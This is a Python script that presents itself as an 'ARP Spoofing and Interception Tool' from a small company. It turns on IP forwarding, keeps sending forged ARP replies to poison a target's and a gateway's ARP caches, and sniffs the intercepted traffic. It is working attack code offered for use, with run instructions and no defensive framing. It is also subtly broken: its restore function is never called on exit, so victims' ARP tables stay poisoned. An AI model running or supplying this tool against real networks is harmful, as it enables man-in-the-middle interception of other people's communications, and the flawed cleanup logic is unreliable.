"""
ARP Spoofing and Interception Tool
Developer: Ronald Baker
Company: Mavericks Umbrella LLC

Disclaimer:
This software is provided by Mavericks Umbrella LLC "as-is" and without any warranties or conditions,
express or implied, including but not limited to the implied warranties of merchantability and fitness for a particular purpose.
In no event shall Mavericks Umbrella LLC or its contributors be liable for any direct, indirect, incidental,
special, exemplary, or consequential damages (including but not limited to procurement of substitute goods or services;
loss of use, data, or profits; or business interruption) however caused and on any theory of liability,
whether in contract, strict liability, or tort (including negligence or otherwise) arising in any way out of
the use of this software, even if advised of the possibility of such damage.

This script performs ARP spoofing to redirect network traffic for interception and analysis.

Instructions:
1. Run the script with `sudo` (superuser privileges are required for ARP manipulation).
2. Enter the target device's IP address and the gateway IP address.
3. The script will send ARP spoofing packets and display traffic interception results.
4. Modify this script to extend functionality as needed.

Required Libraries:
- scapy (Install with `pip install scapy`)

Usage:
sudo python3 arp_spoofing_tool.py
"""

from scapy.all import ARP, send, sniff
import os
import time
import threading

def enable_ip_forwarding():
    """
    Enables IP forwarding to route traffic through the attacker's machine.
    """
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("IP forwarding enabled.")

def disable_ip_forwarding():
    """
    Disables IP forwarding to stop routing traffic.
    """
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    print("IP forwarding disabled.")

def spoof(target_ip, spoof_ip):
    """
    Sends an ARP packet to associate the attacker's MAC address with the target's IP.

    :param target_ip: The target device's IP address.
    :param spoof_ip: The gateway IP address.
    """
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=0)

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    """
    Restores the ARP table by sending the correct mapping.

    :param target_ip: The target device's IP address.
    :param target_mac: The target device's MAC address.
    :param gateway_ip: The gateway IP address.
    :param gateway_mac: The gateway's MAC address.
    """
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=5, verbose=0)

def sniff_packets(interface):
    """
    Sniffs packets on the specified network interface.

    :param interface: The network interface to sniff on.
    """
    print(f"Sniffing packets on interface {interface}. Press Ctrl+C to stop.")
    try:
        sniff(iface=interface, prn=lambda pkt: pkt.summary(), store=0)
    except Exception as e:
        print(f"Error sniffing packets: {e}")

if __name__ == "__main__":
    print("Welcome to the ARP Spoofing and Interception Tool.")
    print("Developer: Ronald Baker")
    print("Company: Mavericks Umbrella LLC\n")

    # Input target and gateway IP addresses
    target_ip = input("Enter the target device's IP address: ").strip()
    gateway_ip = input("Enter the gateway's IP address: ").strip()
    interface = input("Enter the network interface to use (e.g., 'eth0', 'wlan0'): ").strip()

    try:
        enable_ip_forwarding()

        # Start sniffing in a separate thread
        sniff_thread = threading.Thread(target=sniff_packets, args=(interface,))
        sniff_thread.daemon = True
        sniff_thread.start()

        print("Sending ARP spoofing packets. Press Ctrl+C to stop.")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        disable_ip_forwarding()
    except Exception as e:
        print(f"An error occurred: {e}")

